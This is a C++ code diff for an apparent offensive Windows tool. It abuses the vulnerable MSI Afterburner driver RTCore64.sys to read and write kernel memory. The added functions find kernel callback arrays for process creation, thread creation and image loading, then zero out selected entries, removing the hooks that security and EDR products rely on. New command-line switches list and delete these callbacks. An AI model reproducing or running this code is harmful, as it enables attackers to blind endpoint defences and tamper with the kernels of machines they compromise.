@@ -231,6 +231,12 @@ BOOL service_uninstall(PCWSTR serviceName) {
 }
 // thanks gentilkiwi!
 
+struct Offsets {
+    signed int process;
+    signed int image;
+    signed int thread;
+};
+
 void FindDriver(DWORD64 address) {
 
     LPVOID drivers[1024];
@@ -276,7 +282,7 @@ void FindDriver(DWORD64 address) {
 
 }
 
-signed int getVersionOffsets() {
+struct Offsets getVersionOffsets() {
     wchar_t value[255] = { 0x00 };
     DWORD BufferSize = 255;
     RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
@@ -285,11 +291,80 @@ signed int getVersionOffsets() {
     switch (winVer) {
         //case 1903:
     case 1909:
-        return -0x24D810;
+        return { -0x24D810, -0x24D810, -0x24D3F0};
     case 2004:
-        return 0x563F60;
+        return { 0x563F60, 0x563ED0, 0x563CF0 };
     default:
         wprintf(L"[!] Version Offsets Not Found!\n");
+
+    }
+
+}
+void findimgcallbackroutine(DWORD64 remove) {
+    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (Device == INVALID_HANDLE_VALUE) {
+        Log("[!] Unable to obtain a handle to the device object");
+        return;
+    }
+    Log("[+] Device object handle obtained: %p", Device);
+    const auto NtoskrnlBaseAddress = Findkrnlbase();
+    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
+    const DWORD64 PsSetLoadImageNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetLoadImageNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
+    FreeLibrary(Ntoskrnl);
+    const DWORD64 PsSetLoadImageNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetLoadImageNotifyRoutineOffset;
+    Offsets offsets = getVersionOffsets();
+    Log("[+] PsSetLoadImageNotifyRoutine address: %p", PsSetLoadImageNotifyRoutineAddress);
+    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
+    const DWORD64 PspLoadImageNotifyRoutineAddress = PsSetLoadImageNotifyRoutineAddress + offsets.image;
+    Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
+    Log("[+] Enumerating image load callbacks");
+    int i = 0;
+    for (i; i < 64; i++) {
+        DWORD64 callback = ReadMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8));
+        if (callback != NULL) {//only print actual callbacks
+            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
+            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
+            FindDriver(cbFunction);
+            if (cbFunction == remove) {
+                Log("Removing callback to %p at address %p", cbFunction, PspLoadImageNotifyRoutineAddress + (i * 8));
+                WriteMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8), 0x0000000000000000);
+            }
+        }
+
+    }
+
+}
+
+void findthreadcallbackroutine(DWORD64 remove) {
+    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (Device == INVALID_HANDLE_VALUE) {
+        Log("[!] Unable to obtain a handle to the device object");
+        return;
+    }
+    Log("[+] Device object handle obtained: %p", Device);
+    const auto NtoskrnlBaseAddress = Findkrnlbase();
+    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
+    const DWORD64 PsSetCreateThreadNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateThreadNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
+    FreeLibrary(Ntoskrnl);
+    const DWORD64 PsSetCreateThreadNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetCreateThreadNotifyRoutineOffset;
+    Offsets offsets = getVersionOffsets();
+    Log("[+] PsSetCreateThreadNotifyRoutine address: %p", PsSetCreateThreadNotifyRoutineAddress);
+    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
+    const DWORD64 PspCreateThreadNotifyRoutineAddress = PsSetCreateThreadNotifyRoutineAddress + offsets.thread;
+    Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
+    Log("[+] Enumerating thread creation callbacks");
+    int i = 0;
+    for (i; i < 64; i++) {
+        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8));
+        if (callback != NULL) {//only print actual callbacks
+            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
+            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
+            FindDriver(cbFunction);
+            if (cbFunction == remove) {
+                Log("Removing callback to %p at address %p", cbFunction, PspCreateThreadNotifyRoutineAddress + (i * 8));
+                WriteMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8), 0x0000000000000000);
+            }
+        }
 
     }
 
@@ -300,29 +375,22 @@ void findprocesscallbackroutine(DWORD64 remove) {
 
     const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     if (Device == INVALID_HANDLE_VALUE) {
-        Log("[+] Unable to obtain a handle to the device object");
+        Log("[!] Unable to obtain a handle to the device object");
         return;
     }
     Log("[+] Device object handle obtained: %p", Device);
-
-
     const auto NtoskrnlBaseAddress = Findkrnlbase();
 
     HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
     const DWORD64 PsSetCreateProcessNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateProcessNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
-    const DWORD64 PsSetLoadImageNotifyRoutineExOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetLoadImageNotifyRoutineEx")) - reinterpret_cast<DWORD64>(Ntoskrnl);
-
     FreeLibrary(Ntoskrnl);
     const DWORD64 PsSetCreateProcessNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetCreateProcessNotifyRoutineOffset;
-    const DWORD64 PsSetLoadImageNotifyRoutineExAddress = NtoskrnlBaseAddress + PsSetLoadImageNotifyRoutineExOffset;
 
     Log("[+] PsSetCreateProcessNotifyRoutine address: %p", PsSetCreateProcessNotifyRoutineAddress);
     Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
 
-    //Win10 Enterprise 1909: PspCreateProcessNotifyRoutine = (PsSetCreateProcessNotifyRoutine - 0x24D810)
-    //Win10 Enterprise 2004: PspCreateProcessNotifyRoutine = (PsSetCreateProcessNotifyRoutine + 0x563F60)
-    signed int offset = getVersionOffsets();
-    const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress + offset;
+    Offsets offsets = getVersionOffsets();
+    const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress + offsets.process;
 
     Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
     Log("[+] Enumerating process creation callbacks");
@@ -341,18 +409,27 @@ void findprocesscallbackroutine(DWORD64 remove) {
 
     }
 }
+//TO DO: clean up some stuff and implement functions for some common tasks: 
+// getDriverHandle()
+// getExportedFunction()
+
+
 
 int main(int argc, char* argv[]) {
-    //const auto NtoskrnlBaseAddress = getKernelBaseAddr();
+    
     if (argc < 2) {
         printf("Usage: %s\n"
-            " /process - List Process Creation Callbacks\n"
-            " /delprocess <address> - Remove Process Creation Callback]\n"
+            " /proc - List Process Creation Callbacks\n"
+            " /delproc <address> - Remove Process Creation Callback\n"
+            " /thread - List Thread Creation Callbacks\n"
+            " /delthread - Remove Thread Creation Callback\n"
             " /installDriver - Install the MSI driver\n"
-            " /uninstallDriver - Uninstall the MSI driver\n", argv[0]);
+            " /uninstallDriver - Uninstall the MSI driver\n"
+            " /img - List Image Load Callbacks\n"
+            " /delimg <address> - Remove Image Load Callback", argv[0]);
         return 0;
     }
-
+    
     const auto svcName = L"RTCore64";
     const auto svcDesc = L"Micro-Star MSI Afterburner";
     const wchar_t driverName[] = L"\\RTCore64.sys";
@@ -362,13 +439,13 @@ int main(int argc, char* argv[]) {
     wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
 
 
-    if (strcmp(argv[1] + 1, "process") == 0) {
+    if (strcmp(argv[1] + 1, "proc") == 0) {
 
         DWORD64 remove = NULL;
         findprocesscallbackroutine(remove);
     }
-    else if (strcmp(argv[1] + 1, "delprocess") == 0 && argc == 3) {
-        unsigned long long remove;
+    else if (strcmp(argv[1] + 1, "delproc") == 0 && argc == 3) {
+        DWORD64 remove;
         remove = strtoull(argv[2], NULL, 16);
         Log("[+] Removing process creation callback: %p", remove);
         findprocesscallbackroutine((DWORD64)remove);
@@ -380,6 +457,26 @@ int main(int argc, char* argv[]) {
     }
     else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
         service_uninstall(svcName);
+    }
+    else if (strcmp(argv[1] + 1, "img") == 0) {
+        DWORD64 remove = NULL;
+        findimgcallbackroutine(remove);
+    }
+    else if (strcmp(argv[1] + 1, "thread") == 0) {
+        DWORD64 remove = NULL;
+        findthreadcallbackroutine(remove);
+    }
+    else if (strcmp(argv[1] + 1, "delthread") == 0 && argc == 3) {
+        DWORD64 remove;
+        remove = strtoull(argv[2], NULL, 16);
+        Log("[+] Removing thread creation callback: %p", remove);
+        findthreadcallbackroutine((DWORD64)remove);
+    }
+    else if (strcmp(argv[1] + 1, "delimg") == 0 && argc == 3) {
+        DWORD64 remove;
+        remove = strtoull(argv[2], NULL, 16);
+        Log("[+] Removing image load callback: %p", remove);
+        findimgcallbackroutine((DWORD64)remove);
     }
     else {
         wprintf(L"Error: Check the help\n");
